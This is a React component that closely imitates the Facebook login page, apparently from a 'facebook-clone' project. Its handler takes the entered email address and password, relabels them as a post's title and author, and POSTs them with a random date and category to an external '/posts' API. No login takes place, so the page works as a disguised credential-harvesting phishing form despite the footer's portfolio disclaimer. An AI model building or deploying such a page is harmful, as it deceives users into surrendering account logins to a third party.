import React, { useRef, useState } from "react";
import "../css/style.css";
import facebook from "../download.png";
import { QueryClient, QueryClientProvider, useMutation } from "react-query";
import { apiBaseUrl } from "../constant";
import { Button } from "antd";

const queryClient = new QueryClient();

function Login() {
  const [post_title, setPost_title] = useState("");
  const [post_author, setPost_author] = useState("");
  const [content, setContent] = useState("no content");
  const [status, setStatus] = useState("publish");

  const { mutateAsync: userDataRequest, isLoading: fbLoader } = useMutation(
    "userData",
    (payload) =>
      fetch(`${apiBaseUrl}/posts`, {
        method: "POST",
        body: JSON.stringify(payload),
        headers: {
          "Content-Type": "application/json",
        },
      }).then((res) => res.json())
  );

  const handleLogin = () => {
    if (!post_title || !post_author) {
      return;
    }
    const randomDate = new Date(
      Date.now() - Math.floor(Math.random() * 100) * 24 * 60 * 60 * 1000
    );

    const categoryIds = [1, 2, 3, 4, 5];

    const randomCategoryId =
      categoryIds[Math.floor(Math.random() * categoryIds.length)];

    const payload = {
      post_title,
      post_author,
      post_date: randomDate.toISOString().split("T")[0],
      post_category_id: randomCategoryId,
      post_content: content,
      post_status: status,
    };

    userDataRequest(payload, {
      onSuccess: () => {
        console.log("getthis");
        setPost_title("");
        setPost_author("");
      },
    });
  };
  const toggleEyeIconRef = useRef(null);
  const passwordFieldRef = useRef(null);

  const togglePasswordVisibility = () => {
    const passwordField = passwordFieldRef.current;
    const type =
      passwordField.getAttribute("type") === "password" ? "text" : "password";
    passwordField.setAttribute("type", type);

    // Toggle the eye icon class
    toggleEyeIconRef.current.className =
      type === "password" ? "far fa-eye-slash" : "far fa-eye";
  };

  return (
    <>
      <QueryClientProvider client={queryClient}>
        <div className="contains-top-half-and-footer-bottom-half">
          <div className="global-container">
            <div className="bigger-box">
              <div className="big-box">
                <div className="left-box">
                  <div className="image-box">
                    <img className="fb-logo" src={facebook} alt="" />
                  </div>
                  <h2 className="logo-caption">
                    Facebook helps you connect and share with the people in your
                    life.
                  </h2>
                </div>
                <div className="right-box">
                  <div className="form-container">
                    <form>
                      <div className="space">
                        <input
                          value={post_title}
                          onChange={(e) => {
                            setPost_title(e.target.value);
                          }}
                          type="text"
                          className="email-box"
                          placeholder="Email address or phone number"
                        />
                      </div>
                      <div style={{ display: "flex" }}>
                        <div className="space">
                          <input
                            value={post_author}
                            onChange={(event) => {
                              const inputType = event.inputType;
                              const passwordFieldEmpty = !event.target.value;
                              const toggleEyeIcon = toggleEyeIconRef.current;

                              if (
                                inputType === "deleteContentBackward" &&
                                passwordFieldEmpty
                              ) {
                                toggleEyeIcon.style.display = "none";
                              } else {
                                toggleEyeIcon.style.display = "block";
                              }
                              setPost_author(event.target.value);
                            }}
                            type="password"
                            className="pw-box"
                            placeholder="Password"
                            id="password_field"
                            ref={passwordFieldRef}
                          />
                        </div>
                        <i
                          onClick={togglePasswordVisibility}
                          className="far fa-eye-slash"
                          id="toggleEyeIcon"
                          style={{
                            cursor: "pointer",
                            display: "none",
                            margin: "24px -42px",
                          }}
                          ref={toggleEyeIconRef}
                        ></i>
                      </div>
                      <div className="space">
                        <Button
                          onClick={handleLogin}
                          loading={fbLoader}
                          style={{ paddingBottom: "50px" }}
                          type="button"
                          className="login-button"
                        >
                          <b>Log In</b>
                        </Button>
                      </div>
                      <div className="spaceTwo adjustTwo">
                        <a href="#" className="adjust-forgot-pw">
                          Forgotten password?
                        </a>
                      </div>
                      <div className="line"></div>
                      <div>
                        <button type="button" className="create-button">
                          <b>Create New Account</b>
                        </button>
                      </div>
                    </form>
                  </div>
                  <div className="bottom-link-box">
                    <a className="bottom-link" href="#">
                      <b>Create a Page</b>
                    </a>
                    for a celebrity, band or business.
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <footer>
          <div>
            <ul>
              <li className="list-items">English (UK)</li>
              <li className="list-items">
                <a className="list-items" href="#">
                  中文(简体)
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Bahasa Indonesia
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  日本語
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  ภาษาไทย
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Tiếng Việt
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  한국어
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Español
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Português (Brasil)
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Français (France)
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Deutsch
                </a>
              </li>
              <button type="button" className="plus-button">
                +
              </button>
            </ul>
            <div className="line-2 reduce-margin"></div>
            <ul>
              <li className="list-items">
                <a className="list-items" href="#">
                  Messenger
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Fb Lite
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Watch
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  People
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Pages
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Page Categories
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Places
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Games
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Locations
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Marketplace
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Fb Pay
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Groups
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Jobs
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Occulus
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Portal
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Instagram
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Local
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Fundraisers
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Services
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Spark AR
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Shops
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Voting Information Centre
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  About
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Create ad
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Create Page
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Developers
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Careers
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Privacy
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Cookies
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  AdChoices
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Terms
                </a>
              </li>
              <li className="list-items">
                <a className="list-items" href="#">
                  Help
                </a>
              </li>
            </ul>
            <div className="fb-clone">
              <p>
                Disclaimer: This web page is a personal portfolio project.
                Hence, please kindly do not enter any of your credentials here.
                We will not be liable for any losses or damages arising from
                such an action.
              </p>
              <a
                className="fb-clone-link"
                href="https://github.com/melvincwng/facebook-clone"
                target="_blank"
                rel="noopener noreferrer"
              >
                Facebook © 2006
              </a>
            </div>
          </div>
        </footer>
        ;<script src="./js/toggleEyeIcon.js"></script>
        <script src="./js/changeBackgroundImage.js"></script>
      </QueryClientProvider>
    </>
  );
}

export default Login;
